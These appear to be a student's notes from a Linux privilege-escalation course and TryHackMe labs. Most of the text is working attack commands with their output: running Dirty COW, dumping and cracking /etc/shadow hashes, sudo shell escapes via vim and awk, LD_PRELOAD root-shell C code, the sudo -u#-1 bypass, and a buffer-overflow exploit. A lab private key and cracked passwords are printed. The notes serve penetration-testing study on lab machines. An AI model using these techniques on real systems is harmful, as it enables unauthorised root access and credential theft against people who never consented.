# Linux Privilege Escalation for Beginners
https://academy.tcm-sec.com/courses/1154399/lectures/24799431

---
https://tryhackme.com/r/room/linuxprivescarena


Tools Folder: /home/user/tools/

---

# Initial Enumeration

```
# System Info:
ssh TCM@10.10.22.59 
whoami
id
uname -a
arp -a
sudo -l
hostname
cat /proc/version 
cat /etc/issue 
lscpu
ps aux
ps aux | grep root


# Only User info:
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/shadow
cat /etc/group

history


sudo su -

# Network Info:

ip a
route
ip route
arp -a
ip neigh
netstat -ano
netstat -tpln


# Password Info:
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null

> Find Password in the `History Command`
history
locate password | more
find / -name id_rsa 2> /dev/null

```
---

================================================================
# Exploring Automated Tools: https://academy.tcm-sec.com/courses/1154399/lectures/24799431

Resources for this video:

LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum - https://github.com/rebootuser/LinEnum

Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester

Linux Priv Checker - https://github.com/sleventyeleven/linuxprivchecker



## Exploring Automated Tools
----------------------------


```
# Automatic Tools:
cd /tmp
ls -lsa

wget http://192.168.4.51/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
wget http://192.168.4.51/linenum.sh
chmod +x linenum.sh 
wget http://192.168.4.51/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh 
./linux-exploit-suggester.sh

```
---

===============================================================

# Kernel Exploits Overview
https://academy.tcm-sec.com/courses/1154399/lectures/24799428

Kernel Exploits - https://github.com/lucyoa/kernel-exploits


> https://www.exploit-db.com/exploits/40839

[!Note]
> Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
> EDB-ID: 40839 | CVE: 2016-5195


> Dirty Cow: https://dirtycow.ninja/

`CODE`: https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c

```
* $ gcc -pthread c0w.c  -o c0w
* $ ./c0w
```
================================================================

## Kernel Exploit:
```
backup.tar.gz  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ wget http://10.9.0.139/c0w.c
--2024-08-11 11:06:10--  http://10.9.0.139/c0w.c
Connecting to 10.9.0.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4369 (4.3K) [text/x-csrc]
Saving to: “c0w.c”

100%[=====================================================>] 4,369       --.-K/s   in 0.002s  

2024-08-11 11:06:11 (2.34 MB/s) - “c0w.c” saved [4369/4369]

TCM@debian:/tmp$ ls
backup.tar.gz  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ gcc -pthread c0w.c  -o c0w
TCM@debian:/tmp$ ls
backup.tar.gz  c0w  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 6e9d000

id
madvise 0

ptrace 0

TCM@debian:/tmp$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:/tmp$ ls
backup.tar.gz  bak  c0w  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ passwd
root@debian:/tmp# ls
backup.tar.gz  bak  c0w  c0w.c  linenum.sh  linpeas.sh  useless
root@debian:/tmp# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/tmp#
```

---

=========================================================================================================
# Escalation Path: Passwords & File Permissions

https://academy.tcm-sec.com/courses/1154399/lectures/24799427

## Escalation via Stored Passwords
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords

OR

Use Automating Tools: Linpeas.sh or LinEnum.sh

```
root@debian:/home/user# ls
myvpn.ovpn  tools
root@debian:/home/user# cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

root@debian:/home/user# cat /etc/openvpn/auth.txt
user
password321
root@debian:/home/user# history |grep pass
  250  cp /tmp/bak /usr/bin/passwd
  251  passwd
  255  cp passwd /usr/bin/passwd
  279  history |grep pass
root@debian:/home/user# history | grep pass
  250  cp /tmp/bak /usr/bin/passwd
  251  passwd
  255  cp passwd /usr/bin/passwd
  279  history |grep pass
  280  history | grep pass
root@debian:/home/user# exit
exit
TCM@debian:~$ pwd
/home/user
TCM@debian:~$ 

```
---

## Escalation via Weak File Permissions

COPY the /etc/passwd and /etc/shadow

Use `unshadow`:


```
                                                                                              
┌──(kali㉿kali)-[~]
└─$ unshadow passwd shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:!:101:103::/var/spool/exim4:/bin/false
sshd:*:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:*:103:65534::/var/lib/nfs:/bin/false
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash

```

Now use the `hastcat`:

> Search for `hashcat hash type` in Google

`$6$`

Example hashes: 
> https://hashcat.net/wiki/doku.php?id=example_hashes
-------------------------------------

1800 	sha512crypt $6$, SHA512 (Unix) 2 	$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/ 

-----------------------------------------------------------------------------------------------------------------------------------------------------

Hashcat Command:
------------------

```
# Go to Hashcat folder in Windows Host machine

hashcat.exe -m 1800 creds.txt rockyou.txt -o


┌──(kali㉿kali)-[~]
└─$ sudo hashcat -m 1800 unshadow rockyou.txt -O


$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
Cracking performance lower than expected?                 

...
...
...

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 
q

```

> Root pasword: password123

---

##  Escalation via SSH Keys
------------------------------

> https://academy.tcm-sec.com/courses/1154399/lectures/24799433

Ref: PayloadsAllTheThings/Methodology and Resources/Linux - Privilege Escalation.md

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

> [Looting for passwords](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords)

find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

======================================================================

[!Note]
> id_rsa : we keep.

> id_rsa.pub: stored in Authorised_key file in .ssh folder into the Server

========================================================================

```
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
TCM@debian:~$ 

```

### In another Terminal:
-------------------------

```
┌──(kali㉿kali)-[~]
└─$ cd linuxprivescarena 
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ gedit id_rsa  
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ chmod 600 id_rsa    
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ ssh -i id_rsa root@10.10.22.59                  
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~# 

root@debian:~# ls -la
total 44
drwx------  4 root root 4096 Jun 17  2020 .
drwxr-xr-x 22 root root 4096 Jun 17  2020 ..
drwx------  2 root root 4096 May 12  2017 .aptitude
-rw-------  1 root root 5204 Aug 11 13:48 .bash_history
-rw-r--r--  1 root root  564 May 13  2017 .bashrc
-rw-------  1 root root   39 May 13  2017 .lesshst
-rw-------  1 root root   39 Jun 18  2020 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Jun 17  2020 .ssh
-rw-------  1 root root  513 May 14  2017 .viminfo
-rw-------  1 root root    0 May 14  2017 .viminfo.tmp
root@debian:~# cd .ssh/
root@debian:~/.ssh# ls
authorized_keys
root@debian:~/.ssh# ls -la
total 12
drwx------ 2 root root 4096 Jun 17  2020 .
drwx------ 4 root root 4096 Jun 17  2020 ..
-rw------- 1 root root  563 Jun 17  2020 authorized_keys
root@debian:~/.ssh# cat authorized_keys 

```

---

# Escalation Path: Sudo
------------------------
> https://academy.tcm-sec.com/courses/1154399/lectures/24799432

### Resources for this video:

> GTFOBins - https://gtfobins.github.io/

> Linux PrivEsc Playground - https://tryhackme.com/room/privescplayground

===============================================================================

## Escalation via Sudo Shell Escaping
https://academy.tcm-sec.com/courses/1154399/lectures/24799430

E.g.
> https://gtfobins.github.io/gtfobins/vim/

### vim

```
> sudo -l
> sudo vim -c ':!/bin/sh'


TCM@debian:~$ sudo vim -c ':!/bin/sh'

sh-4.1# ^C
sh-4.1# ^C
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# su tcm
Unknown id: tcm
sh-4.1# su TCM
TCM@debian:~$ 

```

https://gtfobins.github.io/gtfobins/awk/#sudo

### awk

```
TCM@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# exit
exit
TCM@debian:~$ 

```
---

## Escalation via Intended Functionality
https://academy.tcm-sec.com/courses/1154399/lectures/24799425

Resources for this video:

wget example - https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/

======================================================================================

> Apache2
---------

> Search in Google and Type: sudo apache2 privilege escalation

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

> /usr/sbin/apache2

```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ 

```

---

##  Escalation via LD_PRELOAD

[!Note]
> We are loading before any other Libraries.

shell.c  
--------
> Code Ref: (https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
``` 

> [!Note]
> Use to Compile:
>Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
>

> Execute any binary with the LD_PRELOAD to spawn a shell : 
`sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`


```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ nano shell.c
TCM@debian:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
TCM@debian:~$ ls
myvpn.ovpn  shell.c  shell.so  tools
TCM@debian:~$ sudo LD_PRELOAD=shell.so  apache2
ERROR: ld.so: object 'shell.so' from LD_PRELOAD cannot be preloaded: ignored.
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ sudo LD_PRELOAD=/home/user/shell.so  apache2
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ 


```

### In Attacker/Attacking Machine:

> We can use `John` to Cracked the Credential or Hash

> Copy the Full Hack in a .txt File:
E.g.

> root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::


```
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ nano hash-tcm.txt
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ john --wordlist=../rockyou.txt hash-tcm.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)     
1g 0:00:00:01 DONE (2024-08-12 05:25) 0.9009g/s 1268p/s 1268c/s 1268C/s cuties..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ 


``` 
---

## Challenge Overview

Resources for this video:

dirsearch - https://github.com/maurosoria/dirsearch

Exploit-DB for Simple CMS - https://www.exploit-db.com/exploits/46635
---

nmap -A -T4 -p- <IP_ADDRESS>

1. Check the FTP first.
ftp <IP>
anonymous
password: anonymous


2. Check Apache

We get the Apache Version

we will go for `dirsearch`

python3 dirsearch.py -u http://10.10.149.152 -e php,html -x 400,401,403

> Result in Directory: /simple 

we can file the CMS simple 2.2.8 exploit => in the Google search

We can downlaoad the python script.

Search:  top 100 seclist

> https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt

```
gedit top-100-passwd.txt
cd /Downloads
python 46635.py -u http://<Ip>/simple --crack -w /root/Downloads/top-100-passwd.txt
```
We get the ID and Password Hash

Next we will Do the `ssh`:

history
cat .bash_history
sudo -l

# go to GTFOBins
# Search for : vim
# sudo: sudo vim -c ':!/bin/sh'
id
exit

> For quit OR exit

:!bash
su TCM

E.g:

```
TCM@debian:~$ sudo vim -c ':!/bin/sh'

sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit

Press ENTER or type command to continue
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# exit
exit

Press ENTER or type command to continue
/bin/bash: q: command not found

shell returned 127

Press ENTER or type command to continue
/bin/bash: q: command not found

shell returned 127

Press ENTER or type command to continue
root@debian:/home/user# su TCM
TCM@debian:~$ 

```

---

# Overview about CVE:

## CVE-2019-14287 Overview
Resources for this video:

Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502
============================================================================

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
    
> So user hacker can't run /bin/bash as root (!root)

EXPLOIT: 

sudo -u#-1 /bin/bash

>[!Note]
> Description :
> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the `sudo priv`
`-u#-1` returns as `0` which is `root's id`

```
Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#
```

## Escalation via CVE-2019-14287
Resources for this video:

Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502

### Sudo Security Bypass
A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series
Walkthrough: https://tryhackme.com/r/room/sudovulnsbypass

```
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ ssh -p 2222 tryhackme@10.10.87.230
The authenticity of host '[10.10.87.230]:2222 ([10.10.87.230]:2222)' can't be established.
ED25519 key fingerprint is SHA256:4bgDOPxI7PFcv5CMfQYEkO7uBqKjLKhd7zZwmE8uwbQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.87.230]:2222' (ED25519) to the list of known hosts.
tryhackme@10.10.87.230's password: 
Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# id
uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# ls
root@sudo-privesc:~# ls -la
total 24
drwxr-xr-x 2 tryhackme tryhackme 4096 Feb  6  2020 .
drwxr-xr-x 4 root      root      4096 Feb  6  2020 ..
-rw------- 1 root      tryhackme   45 Feb  7  2020 .bash_history
-rw-r--r-- 1 tryhackme tryhackme  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tryhackme tryhackme 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 tryhackme tryhackme  807 Apr  4  2018 .profile
root@sudo-privesc:~# cd /root
root@sudo-privesc:/root# ls
root.txt
root@sudo-privesc:/root# cat root.txt 
THM{l33t_s3cur1ty_bypass}
root@sudo-privesc:/root# 

```

---

## Overview and Escalation via CVE-2019-18634
https://academy.tcm-sec.com/courses/1154399/lectures/24799420

==============================================

Resources for this video:

Exploit for CVE-2019-18634 - https://github.com/saleemrashid/sudo-cve-2019-18634

> In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. 
Reference: https://nvd.nist.gov/vuln/detail/CVE-2019-18634

> sudo can be configured by editing a configuration file on your system. In this case that file is called `/etc/sudoers`

> We can change the `sudo` configuration File: `sudo visudo` in the `/etc/sudoers` file

>[!Note]
> you can add things to the `/etc/sudoers` file in order to give lower-privileged users extra permissions. For this exploit we're more interested in one of the other options available: specifically an option called `pwfeedback`. This option is purely `aesthetic`, and is usually `turned off by default`. 

> CVE-2019-18634 is a `Buffer Overflow` attack to get root permissions. It has been patched, but affects versions of sudo earlier than `1.8.26`.

```
sudo cat /etc/sudoers

sudo -V
wget 
gcc -o <output-file> <source-file>
gcc -o exploit exploit.c 


```

Use TryhackMe Room: https://tryhackme.com/r/room/sudovulnsbof

```
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
# gcc
sh: 2: gcc: not found
# exit
sudo: 1 incorrect password attempt
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# ls
exploit
# pwd
/home/tryhackme
# cd /root
# ls
root.txt
# cat root.txt
THM{buff3r_0v3rfl0w_rul3s}
# 


```
---

# Escalation Path: SUID
## SUID Overview
